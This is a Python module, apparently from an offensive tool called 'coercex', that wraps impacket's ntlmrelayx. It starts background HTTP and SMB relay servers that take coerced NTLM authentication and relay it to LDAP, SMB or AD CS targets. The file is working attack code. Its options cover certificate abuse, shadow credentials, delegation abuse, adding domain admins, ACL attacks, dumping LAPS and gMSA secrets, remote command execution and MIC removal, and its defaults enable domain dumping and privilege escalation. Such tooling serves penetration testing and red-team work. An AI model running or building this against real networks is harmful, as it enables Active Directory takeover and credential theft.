"""NTLM relay integration wrapping impacket's ntlmrelayx.

Starts HTTP and/or SMB relay servers in background threads that capture
coerced NTLM authentication and relay it to target services (LDAP, SMB,
HTTP/AD CS, etc.).  The coercex trigger pipeline runs in the async loop
while the relay servers handle the actual NTLM exchange independently.

Usage:
    relay_cfg = RelayConfig(
        relay_targets=["ldap://dc01.corp.local"],
        interface_ip="10.0.0.5",
    )
    relay = RelayManager(relay_cfg)
    relay.start()
    # ... run trigger pipeline ...
    relay.stop()
"""

from __future__ import annotations

import logging
import os
import tempfile
from dataclasses import dataclass, field
from threading import Thread
from typing import Any

log = logging.getLogger("coercex.relay")


@dataclass
class RelayConfig:
    """Configuration for the NTLM relay subsystem."""

    # Relay target(s) -- URLs like ldap://dc01, http://cas/certsrv/, smb://fs01
    relay_targets: list[str] = field(default_factory=list)

    # Network
    interface_ip: str = "0.0.0.0"
    http_port: int = 80
    smb_port: int = 445

    # Relay behaviour
    smb2_support: bool = True
    ipv6: bool = False

    # Attack options
    adcs: bool = False
    adcs_template: str = ""
    altname: str = ""

    shadow_credentials: bool = False
    shadow_target: str = ""
    pfx_password: str = ""
    export_type: str = "PFX"
    cert_outfile: str = ""

    delegate_access: bool = False
    escalate_user: str = ""
    add_computer: bool = False
    dump_laps: bool = False
    dump_gmsa: bool = False
    dump_adcs: bool = False

    # SOCKS proxy for keeping relayed sessions alive
    socks: bool = False

    # Output
    lootdir: str = ""
    output_file: str = ""

    # Misc
    enum_local_admins: bool = False
    command: str = ""
    remove_mic: bool = False


class RelayManager:
    """Manages impacket relay servers as background threads.

    The relay servers listen for coerced NTLM auth connections and relay
    them to the configured targets.  They run in daemon threads so they
    don't block the async event loop.
    """

    def __init__(self, config: RelayConfig):
        self.config = config
        self._threads: set[Thread] = set()
        self._socks_server: Any | None = None
        self._relay_config: Any | None = None  # NTLMRelayxConfig instance

    # ── public API ─────────────────────────────────────────────────

    def start(self) -> None:
        """Start relay servers and optional SOCKS proxy."""
        from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
        from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
        from impacket.examples.ntlmrelayx.servers import (
            HTTPRelayServer,
            SMBRelayServer,
        )
        from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
        from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor

        # Build target processor
        if len(self.config.relay_targets) == 1:
            target_system = TargetsProcessor(
                singleTarget=self.config.relay_targets[0],
                protocolClients=PROTOCOL_CLIENTS,
            )
        else:
            # Write multiple targets to a temp file for TargetsProcessor
            tf = tempfile.NamedTemporaryFile(
                mode="w", suffix=".txt", delete=False, prefix="coercex_targets_"
            )
            for t in self.config.relay_targets:
                tf.write(t + "\n")
            tf.flush()
            tf.close()
            target_system = TargetsProcessor(
                targetListFile=tf.name,
                protocolClients=PROTOCOL_CLIENTS,
            )

        # Optional SOCKS server
        socks_server = None
        if self.config.socks:
            try:
                from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS

                socks_server = SOCKS()
                socks_server.daemon_threads = True
                socks_thread = Thread(target=socks_server.serve_forever, daemon=True)
                socks_thread.start()
                self._socks_server = socks_server
                log.info("SOCKS proxy started on port 1080")
            except Exception as e:
                log.warning("Failed to start SOCKS server: %s", e)

        # Loot directory
        lootdir = self.config.lootdir or os.path.join(os.getcwd(), "loot")
        os.makedirs(lootdir, exist_ok=True)

        relay_servers = [
            (HTTPRelayServer, self.config.http_port),
            (SMBRelayServer, self.config.smb_port),
        ]

        for server_cls, port in relay_servers:
            c = NTLMRelayxConfig()
            c.setProtocolClients(PROTOCOL_CLIENTS)
            c.setRunSocks(self.config.socks, socks_server)
            c.setTargets(target_system)
            c.setMode("RELAY")
            c.setAttacks(PROTOCOL_ATTACKS)
            c.setLootdir(lootdir)
            c.setInterfaceIp(self.config.interface_ip)
            c.setSMB2Support(self.config.smb2_support)
            c.setIPv6(self.config.ipv6)
            c.setDisableMulti(False)
            c.setKeepRelaying(False)
            c.setEncoding("utf-8")
            c.setListeningPort(port)

            # Output
            if self.config.output_file:
                c.setOutputFile(self.config.output_file)

            # Command execution
            if self.config.command:
                c.setCommand(self.config.command)

            # AD CS
            c.setIsADCSAttack(self.config.adcs)
            if self.config.adcs_template:
                c.setADCSOptions(self.config.adcs_template)
            if self.config.altname:
                c.setAltName(self.config.altname)

            # Shadow Credentials
            c.setIsShadowCredentialsAttack(self.config.shadow_credentials)
            if self.config.shadow_credentials:
                c.setShadowCredentialsOptions(
                    self.config.shadow_target,
                    self.config.pfx_password or None,
                    self.config.export_type,
                    self.config.cert_outfile or None,
                )

            # LDAP options (use sensible defaults)
            c.setLDAPOptions(
                dumpdomain=True,
                addda=True,
                aclattack=True,
                validateprivs=True,
                escalateuser=self.config.escalate_user or None,
                addcomputer=self.config.add_computer,
                delegateaccess=self.config.delegate_access,
                dumplaps=self.config.dump_laps,
                dumpgmsa=self.config.dump_gmsa,
                dumpadcs=self.config.dump_adcs,
                sid=None,
                adddnsrecord=None,
            )

            # Exploit options
            c.setExploitOptions(self.config.remove_mic, False)

            # Enum local admins
            c.setEnumLocalAdmins(self.config.enum_local_admins)

            try:
                s = server_cls(c)
                s.start()
                self._threads.add(s)
                server_name = server_cls.__name__
                log.info(
                    "%s relay server started on %s:%d",
                    server_name,
                    self.config.interface_ip,
                    port,
                )
            except Exception as e:
                server_name = server_cls.__name__
                log.warning("Failed to start %s on port %d: %s", server_name, port, e)

        self._relay_config = c  # Keep reference for inspection
        target_list = ", ".join(self.config.relay_targets)
        log.info("Relay targets: %s", target_list)

    def stop(self) -> None:
        """Stop all relay servers."""
        for thread in list(self._threads):
            try:
                if hasattr(thread, "server"):
                    thread.server.shutdown()
            except Exception as e:
                log.debug("Error stopping relay server: %s", e)
        self._threads.clear()

        if self._socks_server:
            try:
                self._socks_server.shutdown()
            except Exception:
                pass
            self._socks_server = None

        log.info("Relay servers stopped")

    @property
    def is_running(self) -> bool:
        return len(self._threads) > 0
